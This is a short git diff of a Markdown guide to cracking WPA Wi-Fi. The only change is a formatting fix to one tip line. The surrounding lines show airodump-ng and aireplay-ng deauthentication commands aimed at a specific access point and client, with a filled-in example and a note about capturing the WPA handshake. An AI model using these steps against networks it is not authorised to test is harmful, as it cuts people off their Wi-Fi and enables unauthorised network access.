@@ -58,7 +58,7 @@ $ sudo airodump-ng --bssid <BSSID> --channel <CH> wlan0mon
 $ sudo aireplay-ng --deauth <MSECONDS> -a <BSSID> -c <TARGERDEVICEMACADDRESS> wlan0mon
 ```
 >Example: `sudo aireplay-ng --deauth 1000 -a EC:08:6B:C7:24:CA -c 28:3F:69:46:2C:F2 wlan0mon`.
--Tip: The greater `MSECONDS` is, the longer that device gets hard time connecting to wi-fi.
+- Tip: The greater `MSECONDS` is, the longer that device gets hard time connecting to wi-fi.
 >After the attack, at the first terminal, you shoul be able to see `WPA handshake: EC:08:6B:C7:24:CA` on top.
 
 ## Decrypting
